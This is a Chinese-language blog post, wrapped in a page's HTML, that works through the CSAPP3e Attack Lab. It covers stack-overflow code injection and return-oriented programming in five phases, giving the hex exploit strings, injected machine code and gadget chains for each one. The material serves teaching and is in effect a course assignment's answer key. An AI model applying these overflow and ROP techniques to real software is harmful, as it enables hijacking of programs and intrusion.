@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+  <head><meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+<meta name="description" content="CSAPP3e:Attacklab"/><meta name="keywords" content="CSAPP, hhdx's blog" /><link rel="alternate" href="/atom.xml" title="hhdx's blog" type="application/atom+xml"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=2.11.0" />
+<link rel="canonical" href="http://hhdx.xyz/2018/03/22/CSAPP3e-Attacklab/"/>
+
+<link rel="stylesheet" type="text/css" href="/lib/fancybox/jquery.fancybox.css" />
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=2.11.0" />
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-177325662-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-177325662-1');
+</script><script id="baidu_push">
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+<script>
+  window.config = {"leancloud":{"app_id":null,"app_key":null},"toc":true,"fancybox":true,"pjax":true,"latex":false};
+</script>
+
+    <title>CSAPP3e:Attacklab - hhdx's blog</title>
+  <meta name="generator" content="Hexo 5.2.0"></head>
+
+  <body><div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/." class="logo">hhdx's blog</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list"><a href="/">
+        <li class="mobile-menu-item">Home
+          </li>
+      </a><a href="/archives/">
+        <li class="mobile-menu-item">Archives
+          </li>
+      </a><a href="/tags/">
+        <li class="mobile-menu-item">Tags
+          </li>
+      </a><a href="/about/">
+        <li class="mobile-menu-item">About
+          </li>
+      </a></ul>
+</nav>
+<div class="container" id="mobile-panel">
+      <header id="header" class="header"><div class="logo-wrapper">
+  <a href="/." class="logo">hhdx's blog</a>
+</div>
+
+<nav class="site-navbar"><ul id="menu" class="menu"><li class="menu-item">
+          <a class="menu-item-link" href="/">
+            Home
+            </a>
+        </li>
+      <li class="menu-item">
+          <a class="menu-item-link" href="/archives/">
+            Archives
+            </a>
+        </li>
+      <li class="menu-item">
+          <a class="menu-item-link" href="/tags/">
+            Tags
+            </a>
+        </li>
+      <li class="menu-item">
+          <a class="menu-item-link" href="/about/">
+            About
+            </a>
+        </li>
+      </ul></nav>
+</header>
+
+      <main id="main" class="main">
+        <div class="content-wrapper">
+          <div id="content" class="content"><article class="post">
+    <header class="post-header">
+      <h1 class="post-title">CSAPP3e:Attacklab
+        </h1>
+
+      <div class="post-meta">
+        <span class="post-time">
+          2018-03-22
+        </span></div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+    <h2 class="post-toc-title">Contents</h2>
+    <div class="post-toc-content">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Code-injection-attacks"><span class="toc-text">Code injection attacks</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Phase-1"><span class="toc-text">Phase 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Phase-2"><span class="toc-text">Phase 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Phase-3"><span class="toc-text">Phase 3</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Return-Oriented-Programming-%E9%9D%A2%E5%90%91%E8%BF%94%E5%9B%9E%E7%BC%96%E7%A8%8B"><span class="toc-text">Return-Oriented Programming 面向返回编程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Phase-4"><span class="toc-text">Phase 4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Phase-5"><span class="toc-text">Phase 5</span></a></li></ol></li></ol>
+    </div>
+  </div><div class="post-content"><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>这是CSAPP这本书的第三个实验，实验所需要的材料在 <a target="_blank" rel="noopener" href="http://csapp.cs.cmu.edu/3e/labs.html">CSAPP3e</a>。</p>
+<p>这个实验分为两部分，第一部分是代码注入实验，主要是通过Gets()函数的堆栈溢出传入指令，然后跳转到指定位置执行的方式来实现执行指定指令；第二部分是ROP实验，因为这里采用栈随机化和堆栈不可执行所以代码注入失效了。ROP利用截取已知某指令序列来创建目的指令的方法来实现的，其中在实验中可利用的指令序列限制为farm.c生成的部分，通过Gets()函数的堆栈溢出传入一系列指令地址和数据实现。</p>
+<h2 id="Code-injection-attacks"><a href="#Code-injection-attacks" class="headerlink" title="Code injection attacks"></a>Code injection attacks</h2><h3 id="Phase-1"><a href="#Phase-1" class="headerlink" title="Phase 1"></a>Phase 1</h3><p>实验目的是test()函数调用getbuf()后执行touch1()函数而不返回test()，所以这里用touch1()的地址覆盖掉test()的地址就可以。getbuf()里面分配了0x28个字节栈空间，所以这里把栈顶的0x28个字节覆盖掉，在末尾添加touch1()的地址就可以了。需要注意字节顺序。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">c0 17 40 00 00 00 00 00    &#x2F;* 0x4017c0 即为touch1()起始地址*&#x2F;</span><br></pre></td></tr></table></figure>
+
+<a id="more"></a>
+
+<h3 id="Phase-2"><a href="#Phase-2" class="headerlink" title="Phase 2"></a>Phase 2</h3><p>实验目的是test()函数调用getbuf()函数后执行touch2(unsigned val)函数，touch2()函数是需要有参数(cookie值)的，所以在执行touch2()之前传入参数到%rdi，这是就需要注入代码了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 fa 97 b9 59       &#x2F;* mov $0x59b997fa,%rdi 传入cookie值*&#x2F;</span><br><span class="line">68 ec 17 40 00             &#x2F;* pushq $0x4017ec touch2地址*&#x2F;</span><br><span class="line">c3                         &#x2F;* retq *&#x2F;</span><br><span class="line">58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58  &#x2F;* 填充 *&#x2F;</span><br><span class="line">78 dc 61 55 00 00 00 00    &#x2F;*栈内指令起始地址 *&#x2F;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Phase-3"><a href="#Phase-3" class="headerlink" title="Phase 3"></a>Phase 3</h3><p>这里需要执行touch3(char * sval)，这里的参数是cookie的字符串的起始地址。touch3()通过调用hexmatch()来校验cookie()，这里尤其要注意字符串存放的地址，因为touch3()和hexmatch()会使用堆栈需要避免字符串位置被覆盖。我这里把字符串存到了hexmatch()函数的堆栈内。通过看hexmatch()的反汇编代码可以发现该函数分配了0x80（128）个字节的栈空间给自己使用（pushq占用的未计算），栈底部的8个字节存放的canary值来避免堆栈溢出所带来的危害，顶部的110个字节来给buf变量使用，所以我就把cookie的字符串存到了中间10个字节里。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">50                       &#x2F;* pushq %rax *&#x2F;</span><br><span class="line">48 c7 c7 69 dc 61 55     &#x2F;* mov $0x5561dc69,%rdi 把字符串的起始地址村放入rdi *&#x2F;</span><br><span class="line">48 b8 35 39 62 39 39     &#x2F;* movq $0x6166373939623935,%rax  *&#x2F;</span><br><span class="line">37 66 61                 </span><br><span class="line">48 89 07                 &#x2F;* movq %rax,(%rdi) 把字符串存放到指定位置*&#x2F;</span><br><span class="line">c6 47 08 00              &#x2F;* movb $0x0,0x8(%rdi) 在字符串末尾添加&#39;\0&#39; *&#x2F;</span><br><span class="line">58                       &#x2F;* popq %rax 没有必要保护%rax好像。。。*&#x2F;</span><br><span class="line">68 fa 18 40 00           &#x2F;* pushq $0x4018fa touch3()地址入栈*&#x2F;</span><br><span class="line">c3                     </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">78 dc 61 55 00 00 00 00</span><br></pre></td></tr></table></figure>
+
+<h2 id="Return-Oriented-Programming-面向返回编程"><a href="#Return-Oriented-Programming-面向返回编程" class="headerlink" title="Return-Oriented Programming 面向返回编程"></a>Return-Oriented Programming 面向返回编程</h2><h3 id="Phase-4"><a href="#Phase-4" class="headerlink" title="Phase 4"></a>Phase 4</h3><p>这里是利用ROP来实现Phase2的内容，这里只需要传入cookie值和相应指令在栈就好。限制只能使用movq，popq，nop，ret指令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">栈顶</span><br><span class="line">popq %rax            0x4019ab</span><br><span class="line"></span><br><span class="line">cookie               0x59b997fa</span><br><span class="line"></span><br><span class="line">movq %rax,%rdi       0x4019a2</span><br><span class="line"></span><br><span class="line">touch2 addresss      0x4017ec</span><br><span class="line"></span><br><span class="line">栈底</span><br></pre></td></tr></table></figure>
+
+<p>所以可以得到以下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30   &#x2F;* 填充 *&#x2F;</span><br><span class="line">ab 19 40 00 00 00 00 00  &#x2F;* popq %rax *&#x2F;</span><br><span class="line">fa 97 b9 59 00 00 00 00  &#x2F;* cookie *&#x2F;</span><br><span class="line">a2 19 40 00 00 00 00 00  &#x2F;* movq %rax,%rdi *&#x2F;</span><br><span class="line">ec 17 40 00 00 00 00 00  &#x2F;* rouch2 *&#x2F;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Phase-5"><a href="#Phase-5" class="headerlink" title="Phase 5"></a>Phase 5</h3><p>实现和Phase3一样的效果调用touch3(char * sval)。因为需要传入字符串地址，所以这里有一些难。通过对farm段指令代码分析可以得知有以下可以利用的指令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">movq %rsp, %rax</span><br><span class="line">movq %rax, %rdi</span><br><span class="line">popq %rax</span><br><span class="line">movl %eax, %edi</span><br><span class="line">movl %eax, %edx</span><br><span class="line">movl %ecx, %esi</span><br><span class="line">movl %edx, %ecx （后边有不相关指令粘连）</span><br><span class="line">movl %esp, %eax</span><br><span class="line">lea （%rdi, %rsi, 1), %rax  （这是至关重要的，这个是原来就存在的指令不是截取的）</span><br></pre></td></tr></table></figure>
+
+<p>所以可以通过rsp+offset的方法确定字符串位置。rsp由movq传递。movl传递offset，因为movl会清零高四字节的内容所以不必担心会有影响。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">栈顶</span><br><span class="line"></span><br><span class="line">movq %rsp, %rax                 0x401a06</span><br><span class="line"></span><br><span class="line">movq %rax, %rdi                 0x4019c5</span><br><span class="line"></span><br><span class="line">popq %rax                       0x4019ab</span><br><span class="line"></span><br><span class="line">offset                          0x48</span><br><span class="line"></span><br><span class="line">movl %eax, %edx                 0x4019dd</span><br><span class="line"></span><br><span class="line">movl %edx, %ecx                 0x401a69sval</span><br><span class="line"></span><br><span class="line">movl %ecx, %esi                 0x401a13</span><br><span class="line"></span><br><span class="line">lea (%rdi, %rsi, 1), %rax       0x4019d6</span><br><span class="line"></span><br><span class="line">movq %rax, %rdi                 0x4019c5</span><br><span class="line"></span><br><span class="line">touch3 address                  0x4018fa</span><br><span class="line"></span><br><span class="line">cookie string                   0x6166373939623935</span><br><span class="line"></span><br><span class="line">栈底</span><br></pre></td></tr></table></figure>
+
+<p>由分析可知字符串位置安全不会被干扰。由此可得以下答案。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">06 1a 40 00 00 00 00 00</span><br><span class="line">c5 19 40 00 00 00 00 00</span><br><span class="line">ab 19 40 00 00 00 00 00</span><br><span class="line">48 00 00 00 00 00 00 00</span><br><span class="line">dd 19 40 00 00 00 00 00</span><br><span class="line">69 1a 40 00 00 00 00 00</span><br><span class="line">13 1a 40 00 00 00 00 00</span><br><span class="line">d6 19 40 00 00 00 00 00</span><br><span class="line">c5 19 40 00 00 00 00 00</span><br><span class="line">fa 18 40 00 00 00 00 00</span><br><span class="line">35 39 62 39 39 37 66 61</span><br><span class="line">00 00 00 00 00 00 00 00</span><br></pre></td></tr></table></figure>
+
+
+
+
+      </div>
+      <div class="post-copyright">
+    <p class="copyright-item">
+      <span>Author: </span>
+      <a href="http://hhdx.xyz">hhdx</a>
+    </p>
+    <p class="copyright-item">
+      <span>Link: </span>
+      <a href="http://hhdx.xyz/2018/03/22/CSAPP3e-Attacklab/">http://hhdx.xyz/2018/03/22/CSAPP3e-Attacklab/</a>
+    </p>
+    <p class="copyright-item">
+      <span>License: </span><a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>
+    </p>
+  </div>
+      <footer class="post-footer">
+        <div class="post-tags">
+            <a href="/tags/CSAPP/">CSAPP</a>
+            </div>
+        
+        <nav class="post-nav"><a class="prev" href="/2019/02/05/%E4%BA%8C%E7%BA%A7%E6%8C%87%E9%92%88%E4%B8%8E%E4%BA%8C%E7%BB%B4%E6%95%B0%E7%BB%84%EF%BC%8C%E6%95%B0%E7%BB%84%E6%8C%87%E9%92%88%E4%B8%8E%E6%8C%87%E9%92%88%E6%95%B0%E7%BB%84/">
+        <i class="iconfont icon-left"></i>
+        <span class="prev-text nav-default">二级指针与二维数组，数组指针与指针数组</span>
+        <span class="prev-text nav-mobile">Prev</span>
+      </a>
+    <a class="next" href="/2018/02/15/linux-windows%E5%85%B1%E4%BA%AB%E8%93%9D%E7%89%99%E8%AE%BE%E5%A4%87/">
+        <span class="next-text nav-default">linux,windows共享蓝牙设备</span>
+        <span class="prev-text nav-mobile">Next</span>
+        <i class="iconfont icon-right"></i>
+      </a>
+    </nav></footer>
+    </article></div><div class="comments" id="comments"><div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a target="_blank" rel="noopener" href="//disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    </div></div>
+      </main>
+
+      <footer id="footer" class="footer"><div class="social-links"><a target="_blank" rel="noopener" href="https://github.com/lc1838228782" class="iconfont icon-github" title="github"></a>
+        <a target="_blank" rel="noopener" href="https://www.douban.com/people/57285004/" class="iconfont icon-douban" title="douban"></a>
+        <a href="/atom.xml" class="iconfont icon-rss" title="rss"></a>
+    </div><div class="copyright">
+  <span class="power-by">
+    Powered by <a class="hexo-link" target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    Theme - 
+    <a class="theme-link" target="_blank" rel="noopener" href="https://github.com/ahonn/hexo-theme-even">Even</a>
+  </span>
+
+  <span class="copyright-year">&copy;2016 - 2020<span class="heart">
+      <i class="iconfont icon-heart"></i>
+    </span>
+    <span class="author">hhdx</span>
+  </span>
+</div>
+</footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div><script type="text/javascript">
+    var disqus_config = function () {
+        this.page.url = 'http://hhdx.xyz/2018/03/22/CSAPP3e-Attacklab/';
+        this.page.identifier = '2018/03/22/CSAPP3e-Attacklab/';
+        this.page.title = 'CSAPP3e:Attacklab';
+    };
+    (function() {
+    var d = document, s = d.createElement('script');
+
+    s.src = '//lyliuchao.disqus.com/embed.js';
+
+    s.setAttribute('data-timestamp', +new Date());
+    (d.head || d.body).appendChild(s);
+    })();  
+  </script><script type="text/javascript" src="/lib/jquery/jquery.min.js"></script>
+  <script type="text/javascript" src="/lib/slideout/slideout.js"></script>
+  <script type="text/javascript" src="/lib/fancybox/jquery.fancybox.pack.js"></script>
+  <script type="text/javascript" src="/js/src/even.js?v=2.11.0"></script>
+</body>
+</html>
